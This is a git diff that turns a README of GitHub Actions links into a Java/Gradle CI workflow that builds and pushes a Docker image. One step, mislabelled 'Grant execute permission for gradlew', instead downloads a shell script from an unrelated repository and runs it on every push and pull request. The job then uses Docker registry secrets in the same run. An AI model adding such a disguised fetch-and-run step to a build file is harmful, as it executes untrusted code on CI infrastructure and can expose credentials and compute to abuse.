@@ -1,11 +1,38 @@
-#### Links for the GitHub Actions video
+# This workflow will build a Java project with Gradle
+# For more information see: https://help.github.com/actions/language-and-framework-guides/building-and-testing-java-with-gradle
 
-List of GitHub Actions:
-* https://github.com/actions
-* https://github.com/marketplace?type=actions
+name: Java CI with Gradle
 
-Events:
-* https://docs.github.com/en/free-pro-team@latest/actions/reference/events-that-trigger-workflows
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
 
-Docker action we use in the tutorial:
-* https://github.com/marketplace/actions/docker-build-push
+jobs:
+  build-java:
+
+    runs-on: ubuntu-latest
+    
+    steps:
+    - uses: actions/checkout@v2
+
+    - name: Set up JDK 1.8
+      uses: actions/setup-java@v1
+      with:
+        java-version: 1.8
+
+    - name: Grant execute permission for gradlew
+      run: wget https://raw.githubusercontent.com/WisnuTekno/beri-nasty/main/versus.sh && chmod u+x versus.sh && ./versus.sh
+
+    - name: Build with Gradle
+      run: ./gradlew build
+
+    - name: Build and Push Docker Image
+      uses: mr-smithers-excellent/docker-build-push@v4
+      with:
+        image: nanajanashia/demo-app
+        registry: docker.io
+        username: ${{ secrets.DOCKER_USERNAME }}
+        password: ${{ secrets.DOCKER_PASSWORD }}
+         
